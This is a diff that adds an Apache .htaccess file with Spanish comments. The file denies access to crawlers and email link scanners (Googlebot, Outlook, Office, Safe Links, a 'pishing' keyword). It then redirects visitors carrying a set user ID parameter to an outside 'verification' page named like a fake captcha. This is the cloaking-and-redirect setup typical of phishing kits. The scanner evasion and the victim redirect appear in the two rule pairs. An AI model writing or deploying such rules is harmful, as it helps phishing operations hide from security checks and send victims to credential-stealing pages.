@@ -1,0 +1,10 @@
+# Activar el motor de reescritura
+RewriteEngine On
+
+# Bloquear ciertos agentes de usuario (user agents)
+RewriteCond %{HTTP_USER_AGENT} ^.*(Googlebot|bot|pishing|office|outlook|safelinks|safelink).*$ [NC]
+RewriteRule ^ - [F,L]
+
+# Redirigir si el parámetro usuario_id es igual a 123
+RewriteCond %{QUERY_STRING} usuario_id=123
+RewriteRule ^$ https://yousitesureonlineverification.com/472/indexcahpta.html [R=301,L]
